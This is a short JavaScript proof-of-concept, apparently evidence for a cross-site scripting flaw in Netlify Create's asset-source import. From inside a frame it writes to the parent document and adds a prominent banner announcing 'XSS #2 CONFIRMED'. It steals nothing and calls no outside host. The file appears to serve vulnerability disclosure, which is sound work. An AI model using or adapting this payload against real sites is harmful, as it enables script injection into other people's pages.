(() => {
  const d = parent.document;
  d.documentElement.setAttribute('data-netlify-create-asset-source-xss', 'confirmed');
  if (d.getElementById('netlify-create-asset-source-xss-proof')) return;
  const b = d.createElement('div');
  b.id = 'netlify-create-asset-source-xss-proof';
  b.textContent = 'XSS #2 CONFIRMED — imported asset-source proof script executed';
  Object.assign(b.style, { position:'fixed', top:'16px', left:'50%', transform:'translateX(-50%)', zIndex:'2147483647', padding:'13px 20px', border:'3px solid #fb7185', borderRadius:'12px', background:'#4c0519', color:'#ffe4e6', boxShadow:'0 12px 36px #0008', font:'700 15px system-ui' });
  d.body.appendChild(b);
})();
